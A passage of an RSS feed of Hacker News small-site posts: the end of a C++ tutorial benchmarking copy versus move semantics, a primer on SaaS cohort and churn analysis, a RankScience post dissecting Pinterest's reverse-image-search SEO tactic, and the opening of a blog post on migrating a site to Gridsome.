        <span>std</span><span>::</span><span>copy</span><span>(</span><span>foo</span><span>.</span><span>mArr</span><span>,</span> <span>foo</span><span>.</span><span>mArr</span> <span>+</span> <span>foo</span><span>.</span><span>mNum</span><span>,</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>);</span>
        <span>this</span><span>-&gt;</span><span>mNum</span> <span>=</span> <span>foo</span><span>.</span><span>mNum</span><span>;</span>
    <span>}</span>
    <span>// Move constructor</span>
    <span>Foo</span><span>(</span><span>Foo</span><span>&amp;&amp;</span> <span>foo</span><span>)</span>
    <span>{</span>
        <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Move constructor called!"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mNum</span> <span>=</span> <span>foo</span><span>.</span><span>mNum</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>foo</span><span>.</span><span>mArr</span><span>;</span>
        <span>foo</span><span>.</span><span>mNum</span> <span>=</span> <span>0</span><span>;</span>
        <span>foo</span><span>.</span><span>mArr</span> <span>=</span> <span>nullptr</span><span>;</span>
    <span>}</span>
    <span>// Move assignment</span>
    <span>Foo</span><span>&amp;</span> <span>operator</span><span>=</span><span>(</span><span>Foo</span><span>&amp;&amp;</span> <span>foo</span><span>)</span>
    <span>{</span>
        <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Move assignment called!"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
        <span>delete</span><span>[]</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mNum</span> <span>=</span> <span>foo</span><span>.</span><span>mNum</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>foo</span><span>.</span><span>mArr</span><span>;</span>
        <span>foo</span><span>.</span><span>mNum</span> <span>=</span> <span>0</span><span>;</span>
        <span>foo</span><span>.</span><span>mArr</span> <span>=</span> <span>nullptr</span><span>;</span>
    <span>}</span>
<span>private:</span>
    <span>size_t</span> <span>mNum</span><span>{</span><span>0</span><span>};</span>
    <span>int</span><span>*</span> <span>mArr</span><span>{</span><span>nullptr</span><span>};</span>
<span>};</span>

<span>inline</span> <span>Foo</span> <span>createFoo</span><span>(</span><span>size_t</span> <span>num</span><span>)</span>
<span>{</span>
    <span>return</span> <span>Foo</span><span>{</span><span>num</span><span>};</span>
<span>}</span>

<span>inline</span> <span>FooIncomplete</span> <span>createFooIncomplete</span><span>(</span><span>size_t</span> <span>num</span><span>)</span>
<span>{</span>
    <span>return</span> <span>FooIncomplete</span><span>{</span><span>num</span><span>};</span>
<span>}</span>

<span>int</span> <span>main</span><span>()</span>
<span>{</span>
    <span>size_t</span> <span>num</span> <span>=</span> <span>10000000</span><span>;</span>

    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Foo:"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"------------------------------"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>Foo</span> <span>foo_1</span><span>{</span><span>num</span><span>};</span> 
    <span>Foo</span> <span>foo_2</span><span>{</span><span>foo_1</span><span>};</span> <span>// Copy constructor called!</span>
    <span>Foo</span> <span>foo_3</span><span>;</span>
    <span>foo_3</span> <span>=</span> <span>foo_1</span><span>;</span> <span>// Copy assignment called!</span>

    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"------------------------------"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>Foo</span> <span>foo_4</span><span>{</span><span>std</span><span>::</span><span>move</span><span>(</span><span>foo_1</span><span>)};</span> <span>// Move constructor called!</span>
    <span>Foo</span> <span>foo_5</span><span>;</span>
    <span>Foo</span> <span>foo_6</span><span>{</span><span>num</span><span>};</span>
    <span>foo_5</span> <span>=</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>foo_6</span><span>);</span> <span>// Move assignment called!</span>
    <span>Foo</span> <span>foo_7</span> <span>=</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>Foo</span><span>{</span><span>num</span><span>});</span> <span>// Move constructor called!</span>

    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"------------------------------"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>

    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"FooIncomplete:"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"------------------------------"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>FooIncomplete</span> <span>fooIncomplete_1</span><span>{</span><span>num</span><span>};</span> 
    <span>FooIncomplete</span> <span>fooIncomplete_2</span><span>{</span><span>fooIncomplete_1</span><span>};</span> <span>// Copy constructor called!</span>
    <span>FooIncomplete</span> <span>fooIncomplete_3</span><span>;</span>
    <span>fooIncomplete_3</span> <span>=</span> <span>fooIncomplete_1</span><span>;</span> <span>// Copy assignment called!</span>

    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"------------------------------"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>FooIncomplete</span> <span>fooIncomplete_4</span><span>{</span><span>std</span><span>::</span><span>move</span><span>(</span><span>fooIncomplete_1</span><span>)};</span> <span>// Copy constructor called!</span>
    <span>FooIncomplete</span> <span>fooIncomplete_5</span><span>;</span>
    <span>FooIncomplete</span> <span>fooIncomplete_6</span><span>{</span><span>num</span><span>};</span>
    <span>fooIncomplete_5</span> <span>=</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>fooIncomplete_6</span><span>);</span> <span>// Copy assignment called!</span>
    <span>FooIncomplete</span> <span>fooIncomplete_7</span> <span>=</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>FooIncomplete</span><span>{</span><span>num</span><span>});</span> <span>// Copy constructor called!</span>

    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"------------------------------"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>

    <span>int</span> <span>numIter</span> <span>=</span> <span>10</span><span>;</span>
    <span>Foo</span> <span>foo</span><span>;</span>
    <span>FooIncomplete</span> <span>fooIncomplete</span><span>;</span>
    <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>time_point</span> <span>fooCopyBegin</span> <span>=</span> <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>now</span><span>();</span>
    <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>numIter</span><span>;</span> <span>i</span> <span>++</span><span>)</span>
    <span>{</span>
        <span>fooIncomplete</span> <span>=</span> <span>createFooIncomplete</span><span>(</span><span>num</span><span>);</span>
    <span>}</span>
    <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>time_point</span> <span>fooCopyEnd</span> <span>=</span> <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>now</span><span>();</span>

    <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>time_point</span> <span>fooMoveBegin</span> <span>=</span> <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>now</span><span>();</span>
    <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>numIter</span><span>;</span> <span>i</span> <span>++</span><span>)</span>
    <span>{</span>
        <span>foo</span> <span>=</span> <span>createFoo</span><span>(</span><span>num</span><span>);</span>
    <span>}</span>
    <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>time_point</span> <span>fooMoveEnd</span> <span>=</span> <span>std</span><span>::</span><span>chrono</span><span>::</span><span>steady_clock</span><span>::</span><span>now</span><span>();</span>

    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Foo copy assignment time: "</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>chrono</span><span>::</span><span>duration_cast</span><span>&lt;</span><span>std</span><span>::</span><span>chrono</span><span>::</span><span>microseconds</span><span>&gt;</span><span>(</span><span>fooCopyEnd</span> <span>-</span> <span>fooCopyBegin</span><span>).</span><span>count</span><span>()</span> <span>&lt;&lt;</span> <span>"[µs]"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Foo move assignment time: "</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>chrono</span><span>::</span><span>duration_cast</span><span>&lt;</span><span>std</span><span>::</span><span>chrono</span><span>::</span><span>microseconds</span><span>&gt;</span><span>(</span><span>fooMoveEnd</span> <span>-</span> <span>fooMoveBegin</span><span>).</span><span>count</span><span>()</span> <span>&lt;&lt;</span> <span>"[µs]"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>To compile the program, please run the following command in the terminal.</p>

<div><div><pre><code><span>$ </span>g++ move.cpp <span>-o</span> move <span>--std</span><span>=</span>c++14
</code></pre></div></div>

<p>We ran the program …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/blog/CPP-lvalue-rvalue-Reference/">https://leimao.github.io/blog/CPP-lvalue-rvalue-Reference/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/blog/CPP-lvalue-rvalue-Reference/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702499</guid>
            <pubDate>Wed, 01 Jul 2020 15:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A primer about cohorts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23702446">thread link</a>) | @michalbugno
<br/>
July 1, 2020 | https://blog.getprobe.io/what-is-cohort-analysis-and-everything-you-need-to-know-to-build-it | <a href="https://web.archive.org/web/*/https://blog.getprobe.io/what-is-cohort-analysis-and-everything-you-need-to-know-to-build-it">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://i.snap.as/bl6T0O4.png" alt=""></p>

<p>Cohort analysis is a method that allows you to break your data set into the specific groups, examine the lifecycle of each group, and compare them to each other.</p>

<p>It is a great way to find critical points within a customer lifecycle. You can use cohort analysis to understand if you are improving the provided service with time.</p>

<p>In the SaaS world, we usually use cohort analysis to get a deeper understanding of churn or customer retention.</p>

<h2 id="how-to-build-a-cohort">How to build a cohort</h2>

<p>Let's take a SaaS company that already has some customer base. The first step is to split the whole customer base into separate groups – cohorts. In SaaS, we usually group customers by the month they joined the service.</p>

<p>For example, in May 2019 our imaginary SaaS company had 120 new customers. This group of 120 customers will form one May 2019 cohort. Now, from these 120 customers, how many were still using the service as of the end of June 2019? Let’s say 100. From this 100 how many were left in July 2019? And so on. You keep asking this question till the current date.</p>

<p>Here is the progression of the May 2019 cohort.</p>

<p><img src="https://i.snap.as/7z7RCO4.png" alt=""></p>

<p>What can you understand by examining this one cohort? One thing is that within just 13 months the company loses 100 from 120 customers it started with. Certainly not the best performance. The biggest drop happens in Month 1 and Month 13. This is also very useful information. Perhaps it is so because the company sells monthly or yearly contracts.</p>

<p>The next step is to add newer cohorts. Customers joining in the month of June 2019 will form the June cohort and so on.</p>

<p>Here is the example of customer cohorts for our SaaS company:</p>

<p><img src="https://i.snap.as/DsxsSvW.png" alt=""></p>

<p>Once you have split your data set into cohorts with the number of customers,  you can use this data to calculate any SaaS metric to get a deeper understanding of them. Let’s see how we can do that on the example of customer churn, MRR churn, and customer retention.</p>

<h2 id="using-cohort-analysis-to-understand-customer-churn">Using cohort analysis to understand customer churn</h2>

<p>Having the cohorts with customers number is nice, but it is not very visual, and still requires a lot of digging into the numbers to understand what is going on.</p>

<p>Let’s use this data and examine customer churn. For each month of the cohort’s life, we have to calculate what % of customers were lost.</p>

<p>For example, in May 2019 we had 120 customers and only 100 of them were left after a month. So the churn for Month 1 will be:</p>

<p><code>(120 - 100) / 120 = 16%</code></p>

<p>When calculating churn for Month 2 we can do two things. We can either calculate it relative to the previous month like so:</p>

<p><code>(100 - 89) / 100 = 11%</code></p>

<p>Or we can calculate it relative to the Month 0:</p>

<p><code>(120 - 89) / 120 = 25%</code></p>

<p>These two approaches give you a slightly different picture. The first tells you churn at any given month of the cohort life. The second gives you an understanding of what percent of all customers from the given cohort (the month 0 number) were lost until the particular month.</p>

<p>For example, if we started with 120 customers, and in Month 3 churn relative to month 0 is 35% it means that we lost 42 customers already.</p>

<p><code>120 * .35 = 42</code></p>

<p>Let’s calculate churn relative to the previous month for all cohorts.</p>

<p><img src="https://i.snap.as/S5Bj15s.png" alt=""></p>

<p>We have added conditional formatting to highlight cells with higher churn and draw attention to them. This feature is available in Google Spreadsheets and Excel and is very useful when it comes to cohorts visualization.</p>

<p>Now you can clearly see at what month your churn is the highest.</p>

<h2 id="a-few-words-on-calculation-relative-to-month-0-vs-previous-month">A few words on calculation relative to month 0 VS previous month</h2>

<p>When looking at cohorts where percent is calculated relative to the previous month it is important to understand that higher percentages do not necessarily mean the highest number of lost customers. For example, losing 20 customers out of a 100 will result in a 20% churn with 20 customers lost, but losing 40 out of a 300 will result in a 13% churn with 40 customers lost. So the churn is lower but the number of lost customers is higher.</p>

<p>When presenting cohorts with percent calculation relative to the previous month it is always useful to pair it with cohorts showing pure numbers. So that a reader can easily understand what actual number a given percentage will convert.</p>

<h2 id="how-to-read-cohort-analysis">How to read cohort analysis</h2>

<p>You have to understand that the time on the cohort table is passing in two directions. From left to right – as each cohort progresses with its life. From top to the bottom – with each new cohort being added at the bottom.</p>

<p>This means two things:</p>
<ol><li>You would expect younger cohorts to perform better compared to the older once. As time passes, hopefully, you improve the service you provide. It becomes more mature. You sell to customers that are a better fit for your product.</li>
<li>You would expect a cohort to stabilize as more months pass. Hopefully, once customers have adopted your product they will stay with it for longer and will not churn at such a high rate as at the beginning of the lifecycle.</li></ol>

<p>Here is how we can apply this to churn cohorts:</p>

<p><img src="https://i.snap.as/9Xx3grt.png" alt=""></p>

<h2 id="using-cohort-analysis-to-understand-mrr-churn">Using cohort analysis to understand MRR churn</h2>

<p>You can use quite a few different metrics as a value for your cohort. MRR is a very good example. By calculating the MRR retention rate for each cohort you can easily understand not only where you lose the most of your money but also if you manage to grow revenue over the lifespan of the specific cohort.</p>

<p>Let’s take a look at the example below:</p>

<p><img src="https://i.snap.as/BHVoC8y.png" alt=""></p>

<p>You can see that in younger cohorts, specifically Feb 2020, Mar 2020, Apr 2020 our company managed to cover all MRR churn by expanding existing customers’ MRR. Thus achieving +100% MRR retention. These cohorts have more MRR in Month 2-4 than in Month 0. This is a great sign that you are doing something right and can expand your existing customer base.</p>

<h2 id="a-different-way-to-visualize-cohorts">A different way to visualize cohorts</h2>

<p>I want to describe one different way to visualize your cohort data. It gives you a good visual clue into the underlying patterns. The approach is to visualize your cohort as a multiple line chart.</p>

<p>Let’s take customer retention this time. We don’t really need to do any additional calculations here. It is the initial data we started our post with. From all customers that sign up in May 2019 how many left in June, and so on.</p>

<p>What we can do is instead of putting these data in the table, we can draw them as lines. The X-axis represents the lifecycle month of the cohort. The Y-axis represents the number of customers left in a given month of the lifecycle.</p>

<p>Here is the example of such visualization for our imaginary company:</p>

<p><img src="https://i.snap.as/ssFqV11.png" alt=""></p>

<p>When examining such visualization you want to look for three main things:</p>
<ol><li>Newer cohort lines should stay above the older cohort lines. That means that the new cohort has more customers and you are able to retain them better.</li>
<li>Hopefully, after the initial drop, the line will stabilize and go almost in parallel with the X-axes. It means that once customers adopt your product they stay with it and churn at a much lower rate than initially.</li>
<li>New lines should have a more shallow initial drop compared to the older ones. You can see on the example above how lines which are on top have much more shallow drops. This means that you are improving your service, and customers need less time to see its value.</li></ol>

<p>There are many different metrics you can use as a cohort value. We presented some of the most common ones.</p>

<p>I hope it was useful and if you have any questions or comments please feel free to reach out.</p>

<p><em>by Alex, co-founder of <a href="https://getprobe.io/?ref=blog" rel="nofollow">Probe</a></em></p>

<p><em>References:</em></p>
<ol><li><em><a href="https://docs.google.com/spreadsheets/d/1UmzQes86sww4Jx6oVbAiH3mwFYRyChEog4btpIiIA4c/edit?usp=sharing" rel="nofollow">Here is Google Spreadsheet</a> with all of the analysis and more I’ve shown in this blog. You can create a copy of it (File –&gt; Make a Copy) and make it your own.</em></li>
<li><em>This post was inspired by the <a href="http://christophjanz.blogspot.com/2013/10/excel-template-for-cohort-analyses-in.html" rel="nofollow">Christoph Janz blog post Excel template for cohort analysis in SaaS.</a> I’ve been following him for a while and he writes a lot of great content on analytics in SaaS. Please check him out.</em></li>
<li><em>Huge thanks to our friend <a href="https://www.linkedin.com/in/aleksandramrzyglod/" rel="nofollow">Aleksandra</a> who helped us with proofreading and shared her experience.</em></li>
<li><em>Illustration by <a href="http://www.saramaese.com/" rel="nofollow">Sara Maese</a> from <a href="https://icons8.com/" rel="nofollow">Icons8</a></em></li></ol>
</div></div>]]>
            </description>
            <link>https://blog.getprobe.io/what-is-cohort-analysis-and-everything-you-need-to-know-to-build-it</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702446</guid>
            <pubDate>Wed, 01 Jul 2020 15:23:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deconstructing Pinterest’s reverse-image-search SEO growth hack]]>
            </title>
            <description>
<![CDATA[
Score 198 | Comments 103 (<a href="https://news.ycombinator.com/item?id=23701998">thread link</a>) | @jenny8lee
<br/>
July 1, 2020 | https://www.rankscience.com/blog/pinterest-image-seo-growth-hack | <a href="https://web.archive.org/web/*/https://www.rankscience.com/blog/pinterest-image-seo-growth-hack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <div id="post-418">
		<div>	
		<p><img src="https://pbs.twimg.com/profile_images/1178728529187495937/xbH7cGaT_400x400.jpg" alt="Ryan Bednar" width="55" height="55"></p>
<p>By <strong><a href="https://twitter.com/ryanbed">Ryan Bednar</a></strong> (CEO of <a href="https://www.rankscience.com/">RankScience</a>)</p>
<blockquote><p><span>Update</span>: This post got a ton of traffic on Hacker News today and&nbsp;Pinterest reached out to comment: “The claim that we scrape Google search results is false. We do not, and never have, scraped Google search results at any time.” The original article suggested Pinterest scrapes Google directly, but instead it seems more likely that Pinterest grabs data from Google through it’s Chrome Extension. We’ll update this post as we learn more from them.</p></blockquote>
<p>A few weeks ago in the Twitterverse, @SwiftOnSecurity <a href="https://twitter.com/SwiftOnSecurity/status/1258875333446717445" target="_blank" rel="noopener noreferrer">outed Pinterest</a> for using a somewhat surprising SEO tactic: for every image uploaded to Pinterest that doesn’t have any real metadata or description of the picture, Pinterest automatically performs a reverse image search on Google, scrapes all of the metadata and descriptions they can find for that image, and then uploads that content onto their site and pretends it’s from their own users.</p>
<p>This is interesting for a couple of reasons:</p>
<ul>
<li dir="ltr" role="presentation"><span>Google typically does not react kindly to anyone trying to scrape its results </span><i><span>for any reason</span></i><span>, so this is incredibly difficult to do at scale (across hundreds of millions of photos) without being blocked.</span></li>
<li dir="ltr" role="presentation"><span>Often when somewhat shady SEO tactics are exposed on Twitter, Google responds by issuing a manual action and penalizing the offending site in search results. This famously happened to </span><a href="https://marketingland.com/10-big-brands-that-were-penalized-by-google-69646"><span>Genius years ago as they were put in time-out</span></a><span> and told to re-evaluate their blackhat SEO strategy. </span></li>
<li dir="ltr" role="presentation"><span>Pinterest is a publicly traded company, so if they’re penalized it could hurt the company’s stock price ($PINS).</span></li>
</ul>
<p><i><span>Content relevance</span></i><span>&nbsp;is a ranking factor in Google. The closer semantically you can describe a topic or image to how Google understands it, the better your chances of ranking higher in their index. Will Google find this behavior flagrantly blackhat and respond accordingly? </span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png" alt="" width="546" height="293" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png 1208w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-300x161.png 300w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-1024x549.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-768x412.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-600x322.png 600w" sizes="(max-width: 546px) 100vw, 546px"></p>

<h2><strong>Some background on Pinterest SEO</strong></h2>
<p><span>Pinterest has been super successful with SEO growth over the years. Their post on </span><a href="https://medium.com/pinterest-engineering/demystifying-seo-with-experiments-a183b325cf4c"><span>Demystifying SEO with Experiments</span></a><span> was particularly inspirational for me in deciding to start </span><a href="https://www.rankscience.com/"><span>RankScience</span></a><span>, an SEO automation and A/B testing company. So any time I hear about programmatic SEO tactics that work on a site as large as Pinterest, with 800M+ pages indexed in Google, I’m intrigued. This is obviously a strategy they would never talk about doing publicly, so it’s fascinating to see it exposed and called out like this.</span></p>
<h2><strong>So how exactly does this Pinterest SEO growth hack work?</strong></h2>
<ul>
<li><span>User uploads a photo to Pinterest without any meta data.</span></li>
<li><span>Pinterest performs a reverse image search on Google for that image.</span></li>
<li><span>Pinterest scrapes all the text captions for related photos that appear from Google.</span></li>
<li><span>Pinterest publishes these text captions under </span><b>What others are saying</b><span> on their own page.</span></li>
<li></li>
</ul>

<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png" alt="Pinterest SEO growth hack" width="504" height="652" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png 940w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-232x300.png 232w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-792x1024.png 792w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-768x993.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-600x776.png 600w" sizes="(max-width: 504px) 100vw, 504px"></p>

<p><span>Voila! Instant unique and scalable SEO text content that maps directly to Google’s understanding of the photo.&nbsp;</span><span>Google indexes the Pinterest page with the new text content and ranks it higher because of the strong relevance of the text on the page to its existing understanding of the photo.&nbsp;</span><span>Rinse and repeat across millions of photos.</span></p>
<h2><strong>The SEO community took notice:</strong></h2>
<h2><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png" alt="Pinterest SEO growth hack community reaction" width="478" height="191" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png 300w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-1024x410.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-768x307.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-600x240.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM.png 1334w" sizes="(max-width: 478px) 100vw, 478px"></h2>
<h2><strong>And what was Google’s response?</strong></h2>
<p><span>John Mu, Webmaster Trends Analyst at Google, and part of the webspam team responsible for policing SEO behavior, chimed in on the thread and offered support for the content available on Pinterest. He didn’t comment directly on this behavior, but I’d bet that the popularity of this thread alerted some people at Google and that there’s an investigation going on internally into this practice at Pinterest. ($PINS) The only reason that Google would let this slide is that they don’t view policing Image Search as high priority.</span></p>
<h2><b>How you can take advantage of Content Relevance to rank higher in Google</b></h2>
<p><span>Content relevance is an important ranking factor in Google search. It’s widely accepted that Google calculates relevance for individual URLs and pieces of content as they relate to a particular query or keyword, and that these quantitative relevance calculations play a role in its ranking algorithms. In the Pinterest example, they’re taking an image that Google already knows about and grabbing multiple text descriptions of that image from Google itself, then combining them in one place to provide one comprehensive page describing the image. This maps exactly to Google’s existing understanding of that image, so the page then likely achieves a very high content relevance score.</span></p>
<p><span>One way you can apply what Pinterest is doing to improve the rankings of content on your own site is to use a NLP method called </span><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"><span>TF-IDF</span></a><span> (term frequency-inverse document frequency). This is a text analysis technique that helps reveal how important a word or phrase is to a document in a corpus (example: a collection of URLs). You can either break out a spreadsheet and do this by hand, or use an advanced content optimization tool like <a href="https://www.rankscience.com/seo-content-insights">RS Content Insights</a> to do this analysis at scale.&nbsp; </span></p>
<p><span>Let’s say that you wanted to rank in Google for </span><i><span>google image search seo</span></i><span>. We already know which documents Google thinks are the most relevant and highest authority for this search term because those are the pages that show up in search results. So we can start by downloading the top 25 URLs ranking in Google for </span><i><span>google image search seo</span></i><span> and performing tf–idf analysis across all of those documents to reveal key topic entities that are semantically related to the search term.</span></p>
<p><span>Here are the topic entities produced by TF-IDF when we ran this post that you’re reading right now through Content Insights for </span><i><span>google image search seo</span></i><span>.</span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png" alt="google image search seo" width="640" height="693" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png 946w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-277x300.png 277w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-768x831.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-600x649.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM.png 1388w" sizes="(max-width: 640px) 100vw, 640px"></p>
<p><span>You’ll see that TF-IDF analysis suggests using keywords like alt tags, alt text, image quality, file size, and stock photos, which are all associated with </span><i><span>google image search seo</span></i><span>, even though they are not replacements or alternatives to the keyword. This gets directly at Google’s understanding of the topic and using this method you can get your content ranking your post higher for having a better content relevance score — it’s often surprisingly effective. In addition to </span><a href="https://www.rankscience.com/coderwall-seo-split-test"><span>SEO A/B testing</span></a><span>, which everyone should be doing by now, using NLP and TF-IDF to refresh and update existing long-form content on your site is an incredibly effective way to grow search traffic and rankings in 2020, and an important tool in any marketing team’s tool kit.</span></p>
<h3>Related Posts</h3>
<ul>
<li><a href="https://www.rankscience.com/coderwall-seo-split-test">How Coderwall grew SEO traffic by 57% with a single SEO A/B test</a></li>
<li><a href="https://www.rankscience.com/blog/how-businesses-boost-sales-with-seo-a-b-testing-on-ecommerce-sites">How eCommerce sites are using SEO A/B testing to boost sales</a></li>
</ul>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png" alt="" width="157" height="157" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png 157w, https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo-150x150.png 150w" sizes="(max-width: 157px) 100vw, 157px"></p>
<p>Get Data-Driven about growing your traffic with <a href="https://www.rankscience.com/">RankScience</a>.</p>

		
	</div>

	</div>
    
                </div></div>]]>
            </description>
            <link>https://www.rankscience.com/blog/pinterest-image-seo-growth-hack</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701998</guid>
            <pubDate>Wed, 01 Jul 2020 14:52:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Website migrated from VuePress to Gridsome posting from Forestry]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23701726">thread link</a>) | @michaelbrooks
<br/>
July 1, 2020 | https://michaelbrooks.co.uk/website-migrated-from-vue-press-to-gridsome-posting-from-forestry/ | <a href="https://web.archive.org/web/*/https://michaelbrooks.co.uk/website-migrated-from-vue-press-to-gridsome-posting-from-forestry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
Posted 24. June 2020.
<strong>1 min read.</strong></p></div><div><div><div><p>Yesterday, I published my new website which has been created with <a href="https://gridsome.org/" title="Gridsome" target="_blank" rel="nofollow noopener noreferrer">Gridsome</a>. I had to reformat my blog posts and add tags to each of them. I have 156 posts, so this was not an easy task, to say the least.</p>
<p>Now I'm writing my first blog post using Forestry, and with any luck, it will post to my repository and deploy to my site with no issues. That's if I've set up the formatting correctly and everything else that comes with it.</p>
<p>I now have a newsletter which you can subscribe to using the form at the bottom of this post. Signing up is easy and it will make sure you never miss an update. However, if you're more of an RSS person, then I have that too.</p>
<p>There are a few more things I would like to add to my website such as comments that aren't by Disqus, social card metadata and an auto-generated sitemap. I should probably create a roadmap on my <a href="https://github.com/Michael-Brooks/michaelbrooks.co.uk" title="GitHub repository" target="_blank" rel="nofollow noopener noreferrer">GH repository</a> for you to keep an eye on.</p>
